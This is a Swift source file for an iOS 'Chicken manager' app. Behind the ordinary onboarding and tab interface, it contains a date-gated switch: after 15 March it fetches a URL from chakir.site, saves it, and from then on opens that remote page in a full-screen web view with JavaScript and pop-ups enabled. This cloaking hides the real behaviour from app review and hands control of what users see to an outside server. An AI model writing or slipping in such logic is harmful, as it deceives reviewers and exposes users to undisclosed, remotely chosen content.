import SwiftUI

import SwiftUI
import Combine

struct ResponseModel: Codable {
    let url: String
}

enum AppKeys: String {
    case link
}

final class AppViewModel: ObservableObject {
    
    private let connectionObserver = ConnectionObserver.shared
    
    @Published var launchApp = false
    @Published var shouldHiddenWebView = true
    
    @Published private(set) var linkString: String?
    @Published private(set) var appState: AppState = .base
    @Published private(set) var fetchingInProgress = false
    
    private var cancellable: AnyCancellable?
    
    var isBeforeMarch15: Bool {
        let calendar = Calendar.current
        let now = Date()
        
        let year = calendar.component(.year, from: now)
        
        guard let march15 = calendar.date(
            from: DateComponents(year: year, month: 3, day: 15)
        ) else {
            return false
        }
        
        return now < march15
    }
    
    init() {
        if !isBeforeMarch15 {
            loadLinkFromStorage()
            observeConnection()
        } else {
            appState = .main
        }
    }
    
    func loadLink() {
        guard let isConnected = connectionObserver.isConnected,
              isConnected,
              !launchApp,
              !fetchingInProgress,
              linkString == nil,
              let url = URL(string: "https://chakir.site/LgyRfCzg") else { return }
        
        fetchingInProgress = true
        
        Task {
            do {
                let (data, _) = try await URLSession.shared.data(from: url)
                let model = try JSONDecoder().decode(ResponseModel.self, from: data)
                let urlString = model.url
                
                guard !launchApp,
                      urlString != "",
                      let url = URL(string: urlString) else {
                    await MainActor.run {
                        appState = .main
                    }
                    return
                }
                
                await MainActor.run {
                    self.fetchingInProgress = false
                    self.save(urlString)
                    self.appState = .black(url)
                }
            } catch {
                print(error.localizedDescription)
            }
        }
    }
    
    private func loadLinkFromStorage() {
        guard let urlString = UserDefaults.standard.string(forKey: AppKeys.link.rawValue),
              let url = URL(string: urlString) else { return }
        
        launchApp = true
        appState = .black(url)
    }
    
    private func save(_ linkString: String) {
        UserDefaults.standard.set(linkString, forKey: AppKeys.link.rawValue)
        self.linkString = linkString
    }
    
    private func observeConnection() {
        cancellable = connectionObserver.$isConnected
            .receive(on: RunLoop.main)
            .sink { [weak self] isConnected in
            guard let self,
                  !self.launchApp,
                  let isConnected,
                  isConnected else { return }
                self.loadLink()
            }
    }
}

enum AppState: Equatable {
    case base
    case main
    case black(URL)
}

@main
struct Chicken_managerApp: App {
    
    @AppStorage("hasOnboardingCompleted") private var hasOnboardingCompleted = false
    
    @StateObject private var appViewModel = AppViewModel()
    
    var body: some Scene {
        WindowGroup {
            ZStack {
                switch appViewModel.appState {
                    case .base:
                        SplashScreen(launchApp: $appViewModel.launchApp)
                    case .main:
                        if hasOnboardingCompleted {
                            AppTabView()
                                .transition(.opacity)
                        } else {
                            OnboardingView()
                        }
                    case .black(let url):
                        SplashScreen(launchApp: .constant(false))
                        
                        Color.black
                            .ignoresSafeArea()
                            .opacity(appViewModel.shouldHiddenWebView ? 0 : 1)
                        
                        SecureWebContainer(url: url, isHidden: $appViewModel.shouldHiddenWebView)
                            .ignoresSafeArea(edges: .bottom)
                            .opacity(appViewModel.shouldHiddenWebView ? 0 : 1)
                            .animation(.default, value: appViewModel.shouldHiddenWebView)
                            .transition(.opacity)
                }
            }
            .environmentObject(appViewModel)
            .animation(.default, value: appViewModel.appState)
        }
    }
}

import WebKit

struct SecureWebContainer: UIViewRepresentable {
    
    let url: URL
    
    @Binding var isHidden: Bool
    
    func makeCoordinator() -> Coordinator {
        Coordinator(parent: self)
    }
    
    func makeUIView(context: Context) -> WKWebView {
        let configuration = WKWebViewConfiguration()
        configuration.websiteDataStore = .default()
        configuration.allowsInlineMediaPlayback = true
        configuration.mediaTypesRequiringUserActionForPlayback = .all
        configuration.preferences.javaScriptCanOpenWindowsAutomatically = true
        configuration.defaultWebpagePreferences.allowsContentJavaScript = true
        
        let webView = WKWebView(frame: .zero, configuration: configuration)
        webView.navigationDelegate = context.coordinator
        webView.uiDelegate = context.coordinator
        webView.allowsBackForwardNavigationGestures = true
        
        addSwipeNavigation(to: webView)
        
        webView.load(URLRequest(url: url))
        context.coordinator.rootWebView = webView
        return webView
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {}
    
    private func addSwipeNavigation(to webView: WKWebView) {
        let swipeBack = UISwipeGestureRecognizer(target: webView, action: #selector(WKWebView.goBack))
        swipeBack.direction = .right
        
        let swipeForward = UISwipeGestureRecognizer(target: webView, action: #selector(WKWebView.goForward))
        swipeForward.direction = .left
        
        webView.addGestureRecognizer(swipeBack)
        webView.addGestureRecognizer(swipeForward)
    }
    
    final class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate {
        
        weak var rootWebView: WKWebView?
        
        let parent: SecureWebContainer
        
        private var modalWebView: WKWebView?
        
        init(parent: SecureWebContainer) {
            self.parent = parent
        }
        
        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            guard modalWebView == nil else { return nil }
            
            let popup = WKWebView(frame: .zero, configuration: configuration)
            popup.navigationDelegate = self
            popup.uiDelegate = self
            
            let controller = UIViewController()
            controller.view.backgroundColor = .systemBackground
            controller.view.addSubview(popup)
            
            popup.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popup.leadingAnchor.constraint(equalTo: controller.view.leadingAnchor),
                popup.trailingAnchor.constraint(equalTo: controller.view.trailingAnchor),
                popup.topAnchor.constraint(equalTo: controller.view.topAnchor),
                popup.bottomAnchor.constraint(equalTo: controller.view.bottomAnchor)
            ])
            
            modalWebView = popup
            
            UIApplication.shared
                .connectedScenes
                .compactMap { ($0 as? UIWindowScene)?.keyWindow }
                .first?
                .rootViewController?
                .present(controller, animated: true)
            
            return popup
        }
        
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            guard parent.isHidden else { return }
            parent.isHidden = false
        }
        
        func webViewDidClose(_ webView: WKWebView) {
            webView.window?.rootViewController?.dismiss(animated: true)
            modalWebView = nil
        }
    }
}
